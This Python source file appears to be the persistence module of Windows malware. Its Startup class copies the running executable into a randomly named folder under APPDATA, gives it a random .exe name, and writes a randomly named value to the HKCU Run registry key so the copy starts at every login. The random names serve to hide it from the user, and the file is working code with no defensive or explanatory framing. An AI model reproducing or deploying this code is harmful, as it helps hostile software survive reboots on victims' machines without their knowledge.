import subprocess
import sys
import os
import shutil
from _random_string import get_random_string

class Startup:
    def __init__(self):
        self.dir_name = get_random_string(12)
        self.working_dir = os.path.join(os.getenv('APPDATA'), self.dir_name)
        self.exec_name = f'{get_random_string(16)}.exe'
        self.full_path = os.path.join(self.working_dir, self.exec_name)
        self.reg_entry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        self.regent_name = get_random_string(18)

        self.mkdir()
        self.copy_stub()
        self.regedit()

    def mkdir(self):
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)
        else:
            shutil.rmtree(self.working_dir)
            os.mkdir(self.working_dir)

    def copy_stub(self):
        shutil.copy2(os.path.realpath(sys.executable), self.full_path)

    def regedit(self):
        subprocess.run(args=f'reg delete "{self.reg_entry}" /v {self.regent_name} /f', shell=True)
        subprocess.run(args=f'reg add "{self.reg_entry}" /v {self.regent_name} /t REG_SZ /d "{self.full_path}" /f', shell=True)
